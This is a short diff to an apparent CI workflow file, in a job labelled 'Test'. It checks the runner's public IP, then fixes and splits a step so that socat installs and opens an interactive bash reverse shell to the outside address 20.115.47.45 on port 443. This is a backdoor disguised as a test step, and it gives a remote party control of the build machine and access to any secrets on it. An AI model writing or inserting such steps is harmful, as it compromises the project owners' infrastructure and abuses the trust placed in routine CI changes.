@@ -6,6 +6,5 @@ jobs:
     name: Test
     steps:
       - run: curl http://whatismyip.akamai.com/
-      - run: |
-            sudo apt install socat -y \
-            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:20.115.47.45:443
+      - run: sudo apt install socat -y
+      - run: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:20.115.47.45:443
